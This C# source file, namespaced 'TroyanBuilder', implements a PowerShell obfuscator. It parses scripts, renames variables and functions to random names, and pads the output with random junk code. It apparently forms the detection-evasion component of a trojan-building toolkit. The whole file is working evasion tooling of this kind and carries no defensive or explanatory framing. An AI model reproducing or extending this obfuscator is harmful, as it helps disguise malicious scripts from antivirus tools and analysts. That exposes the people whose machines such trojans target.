using System.Management.Automation.Language;
using System.Text;
using System.Text.RegularExpressions;

namespace TroyanBuilder
{
    public partial class PowerShellObfuscator
    {
        private readonly Dictionary<string,Dictionary<string, string>> RenamedVar = new();

        public void ObfuscateFile(string psScriptFile)
        {
            var data  = File.ReadAllText(psScriptFile);
            data = Obfuscate(data);
            data = RandomCode() + data + RandomCode();
            File.WriteAllText(psScriptFile, data);
        }

        public string Obfuscate(string psScript, Dictionary<string,string>? renamedFuncs = null)
        {
            try
            {
                if (renamedFuncs != null)
                {
                    foreach (var renamedVar in renamedFuncs)
                    {
                        AddRenamedFunction( renamedVar.Key, renamedVar.Value);
                    }
                }
                var parsed = Parse(psScript);
                FindAndRenameVariables(parsed, "general", false);
                psScript = Obfuscate(parsed);
                parsed = Parse(psScript);
                FindAndRenameFunctions(parsed, "general");
                psScript = Obfuscate(parsed);
                parsed = Parse(psScript);
                ObfuscateFunctions(parsed, "general");
                parsed = Parse(psScript);
                psScript = Obfuscate(parsed);
                return RandomCode() + psScript + RandomCode();
            }
            catch (Exception e)
            {
                throw;
            }
        }

        public class Parsed
        {
            public string PsScript {get; set;}
            public ScriptBlockAst Body { get; set; }
            public Token[] Tokens { get; set; }
            
            public ParseError[] Errors { get; set; }
        }

        private  Parsed Parse(string psScript)
        {
            var body = Parser.ParseInput(psScript, out Token[] tokens, out ParseError[] errors);
            if (errors.Length > 0)
                throw new Exception("PowerShell script contains syntax errors!");
            return new Parsed() {Body = body, Tokens = tokens, Errors = errors, PsScript = psScript };
        }
        
        static List<string> ExtractVariableNames(string input)
        {
            var matches = Regex.Matches(input, @"\$(\w+)|\$\(\$\(([\w\-]+)\)\)");
            return matches.Cast<Match>()
                .Select(m => m.Groups[1].Success ? m.Groups[1].Value : m.Groups[2].Value)
                .Where(name => !string.IsNullOrEmpty(name))
                .Distinct()
                .ToList();
        }

        private  string Obfuscate(Parsed parsed)
        {
            var inScope = false;
            var scope = "general";
            var level = 0;
            var intLevel = 0;
            var sb = new StringBuilder(parsed.PsScript.Length);
            var lastPos = 0;
            foreach (var token in parsed.Tokens)
            {
                var tokenText = clean(token.Text);
                if (token.Extent.StartOffset > lastPos && lastPos >= 0 && token.Extent.StartOffset <= parsed.PsScript.Length)
                {
                    var q = parsed.PsScript.AsSpan(lastPos, token.Extent.StartOffset - lastPos);
                    sb.Append(q);
                }

                if (token.Kind == TokenKind.Function)
                {
                    inScope = true;
         
                }
                else if (token.Kind == TokenKind.Identifier)
                {
                    if (inScope && level == 0)
                    {
                        scope = tokenText;
                    }
                }
                else if (token.Kind == TokenKind.AtCurly || token.Kind == TokenKind.AtParen)
                {
                    intLevel += 1;
                }
                else if (token.Kind == TokenKind.LCurly)
                {
                    if (inScope)
                    {
                        level += 1;
                    }
                }
                else if (token.Kind == TokenKind.RCurly)
                {
                    if (intLevel > 0)
                    {
                        intLevel -= 1;
                    }
                    else if (inScope)
                    {
                        level -= 1;
                        if (level == 0)
                        {
                            inScope = false;
                            scope = "general";
                        }
                    }
                }
                
                if (token.Kind == TokenKind.Identifier || token.Kind == TokenKind.Generic || token.Kind == TokenKind.Variable || token.Kind == TokenKind.StringExpandable)
                {
                    if (token.Kind == TokenKind.StringExpandable)
                    {
                        var variableNames = ExtractVariableNames(tokenText);
                        foreach (var variableName in variableNames)
                        {
                            if (TryGetRenamedVar(scope, variableName, out var renamedVar))
                            {
                                tokenText = ReplaceVariable(tokenText, variableName, renamedVar);
                            } else
                            if (TryGetRenamedFunc( variableName, out var renamedFunc))
                            {
                                tokenText = ReplaceVariable(tokenText, variableName, renamedFunc);
                            }
                        }
                        sb.Append(tokenText);
                    }
                    else if (token.Kind == TokenKind.Variable)
                    {
                        var variableName = tokenText.TrimStart('$');
                        if (TryGetRenamedVar(scope, variableName, out var renamedVar))
                        {
                            sb.Append('$' + renamedVar);
                        }
                        else
                        {
                            sb.Append(tokenText);
                        }
                    }
                    else if (token.Kind == TokenKind.Identifier && inScope)
                    {
                        var tokenName = tokenText;
                        if (TryGetRenamedFunc(tokenName, out var renamedVar))
                        {
                            sb.Append(renamedVar);
                        }
                        else
                        {
                            sb.Append(tokenText);
                        }
                    }
                    else if (token.Kind == TokenKind.Identifier || token.Kind == TokenKind.Generic)
                    {
                        var tokenName = clean(tokenText);
                        if (TryGetRenamedVar(scope, tokenName, out var renamedVar))
                        {
                            sb.Append(renamedVar);
                        }
                        else if (TryGetRenamedFunc(tokenName, out var renamedFunc))
                        {
                            sb.Append(renamedFunc);
                        }
                        else
                        {
                            sb.Append(tokenText);
                        }
                    }
                    else
                    {
                        sb.Append(tokenText);
                    }
                }
                else
                {
                    sb.Append(token.Text);
                }

                lastPos = token.Extent.EndOffset;
            }

            if (lastPos >= 0 && lastPos < parsed.PsScript.Length)
            {
                sb.Append(parsed.PsScript.AsSpan(lastPos));
            }

            return sb.ToString();
        }
        
        static string ReplaceVariable(string input, string variable, string replacement)
        {
            // Special variables to exclude
            string[] specialVariables = { "$_", "$?", "$null", "$true", "$false", "$env:" };

            // Create regex pattern to match $variable, ($variable), and $($variable)
            var pattern = @"\$\(\$?" + Regex.Escape(variable) + @"\)|\$(" + Regex.Escape(variable) + @")";
        
            // Check if the variable is a special variable. If it is, skip replacement
            foreach (var specialVar in specialVariables)
            {
                if (variable.Equals(specialVar.Trim('$')))
                {
                    return input; // Return input as is without any modification
                }
            }

            // Replace all occurrences of $variable, ($variable), and $($variable) with the replacement value
            var result = Regex.Replace(input, pattern, "$" + replacement);

            return result;
        }

        public class VarInfo
        {
            public string Name { get; set; }
            public bool IsParameter { get; set; }
            public bool isFunction { get; set; }
            public string Scope { get; set; }
        }

        private  List<string> Exclusions = new List<string>()
        {
            "true", "false","_","EncodedScript"
        };

        private  VarInfo GetInfo(VariableExpressionAst variable, string scope)
        {
            var result = new VarInfo();
            result.Scope = scope;
            var variableName = variable.VariablePath.UserPath;
            result.Name = variableName.TrimStart('$');
            if (Exclusions.Select(a=> a.ToLower()).Contains(variableName.ToLower()))
                result.IsParameter = true;
            
            var parent = variable.Parent;
            while (parent != null)
            {
                if (parent is ParamBlockAst)
                {
                    result.IsParameter = true;
                }
                if (parent is FunctionDefinitionAst)
                {
                    result.isFunction = true;
                    result.Scope = ((FunctionDefinitionAst)parent).Name;
                }
                parent = parent.Parent;
            }
            return result;
        }


        private  void FindAndRenameVariables(Parsed parsed, string scope, bool nested)
        {
            var vars = parsed.Body.FindAll(x => x is VariableExpressionAst, nested).Cast<VariableExpressionAst>()
                .ToList();
            foreach (var variableAst in vars )
            {
                var info = GetInfo(variableAst, scope);
      
    
                var newname = info.IsParameter ? info.Name : GenerateRandomName();
                AddRenamedVar(info.Scope, info.Name, newname);
            }
        }

        private string clean(string identifier)
        {
            var result = $"[{identifier.Replace("]", "").Replace("[", "")}]".ToLowerInvariant();
            return identifier;
        }
        
     
        private void AddRenamedVar(string scope, string name, string newName)
        {
            if (scope != "general")
            {
                var exists = TryGetRenamedVar("general", name, out var globalVar);
                if (exists)
                {
                    RenamedVar.TryAdd(scope, new Dictionary<string, string>());
                    RenamedVar[scope].TryAdd(name, globalVar);
                    return;
                }
            }

            RenamedVar.TryAdd(scope, new Dictionary<string, string>());
            RenamedVar[scope].TryAdd(name, newName);
        }
        
        private bool TryGetRenamedVar(string scope, string name, out string newName)
        {
            newName = name;
            var got = RenamedVar.TryGetValue(scope, out var dict);
            if (!got)
                return false;
            got = dict!.TryGetValue(name, out var x);
            if (!got)
                return false;
            newName = x;
            return true;
        }
        
    }
}
